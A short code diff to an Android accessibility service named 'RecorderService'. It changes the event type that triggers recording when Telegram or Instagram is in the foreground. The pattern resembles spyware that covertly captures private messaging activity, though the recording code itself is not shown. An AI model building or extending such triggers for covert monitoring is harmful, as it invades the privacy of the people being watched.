@@ -24,7 +24,7 @@ class MyAccessibilityService : AccessibilityService() {
     private val tag = "RecorderService"
     @SuppressLint("NewApi")
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
-        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
             val packageName = event.packageName?.toString()
             if (packageName == "org.telegram.messenger" || packageName == "com.instagram.android") {
                 if (!isRecording) {
